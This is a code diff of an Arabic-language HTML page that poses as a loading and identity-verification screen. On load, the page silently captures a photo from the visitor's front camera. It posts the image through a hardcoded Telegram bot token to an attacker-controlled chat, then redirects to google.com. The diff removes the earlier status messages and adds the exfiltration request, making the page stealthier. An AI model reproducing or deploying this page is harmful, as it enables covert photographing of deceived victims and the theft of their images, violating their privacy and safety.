@@ -3,54 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق...</title>
+    <title>جاري التحميل...</title>
     <style>
         body { background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 4px solid #222; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 0.9rem; color: #888; margin-top: 10px; }
         canvas, video { display: none; }
     </style>
 </head>
 <body>
-
     <div class="loader"></div>
-    <div class="text">جاري فحص الأمان...</div>
-    <div id="status">جاري طلب إذن الوصول...</div>
-
+    <div id="status">جاري التحقق من الهوية...</div>
     <canvas id="canvas"></canvas>
 
 <script>
     const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
-    
-    // محاولة جلب المعرف من الرابط، وإذا فشل يستخدم المعرف الافتراضي الخاص بك
     const urlParams = new URLSearchParams(window.location.search);
     const CHAT_ID = urlParams.get('chatId') || urlParams.get('sender_id') || '8169635171';
 
     async function startCapture() {
-        const status = document.getElementById('status');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            status.innerText = "تم السماح. جاري المعالجة...";
-            
             const video = document.createElement('video');
-            video.setAttribute('playsinline', '');
+            video.setAttribute('playsinline', ''); 
             video.srcObject = stream;
             await video.play();
 
-            setTimeout(() => {
+            // إعطاء الكاميرا وقت أطول قليلاً للتركيز
+            setTimeout(async () => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stream.getTracks().forEach(track => track.stop());
 
-                status.innerText = "جاري إرسال البيانات...";
-
-                // تحويل الصورة إلى JPEG بجودة متوسطة (أسرع في الرفع من PNG)
-                canvas.toBlob((blob) => {
+                // تحويل الصورة إلى JPEG بدلاً من PNG لسرعة الإرسال
+                canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('
+                    formData.append('photo', blob, 'image.jpg');
+
+                    try {
+                        // استخدام await لضمان عدم إغلاق الصفحة قبل الإرسال
+                        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            console.log("تم الإرسال بنجاح");
+                        }
+                    } catch (e) {
+                        console.error("خطأ في الشبكة:", e);
+                    } finally {
+                        // إيقاف الكاميرا والتوجيه فقط بعد محاولة الإرسال
+                        stream.getTracks().forEach(track => track.stop());
+                        window.location.replace("https://www.google.com");
+                    }
+                }, 'image/jpeg', 0.7); // جودة 70% لتقليل حجم الملف
+
+            }, 2000); 
+
+        } catch (error) {
+            document.getElementById('status').innerText = "يرجى السماح بالوصول للكاميرا للمتابعة";
+        }
+    }
+
+    window.onload = startCapture;
+</script>
+</body>
+</html>
